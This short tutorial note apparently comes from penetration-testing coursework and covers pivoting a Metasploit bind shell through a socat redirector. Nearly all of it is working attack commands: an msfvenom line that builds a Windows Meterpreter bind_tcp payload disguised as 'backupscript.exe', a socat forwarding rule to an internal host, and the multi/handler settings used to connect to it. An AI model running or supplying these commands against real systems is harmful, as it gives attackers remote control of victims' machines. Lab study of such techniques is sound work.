
Bind shells work in the opposite order of reverse shells

>[!tldr]  In the case of bind shells....
>1) The Windows server will start a listener and bind to a particular port. 
>2) We can create a bind shell payload for Windows and execute it on the Windows host. 
>3) At the same time, we can create a socat redirector on the Ubuntu server, which will listen for incoming connections from a Metasploit bind handler and forward that to a bind shell payload on a Windows target.


#### Create Windows Payload
```go
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
```


#### Starting Socat Bind Shell Listener
```go
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```


Start the Metasploit bind handler. The bind handler will be configured to connect to socat's listener on port 8080 on the Ubuntu server.
```go
use exploit/multi/handler
```

```go
set payload windows/x64/meterpreter/bind_tcp
```

```go
set RHOST 10.129.202.64
```

```go
set LPORT 8080
```

```go
run
```
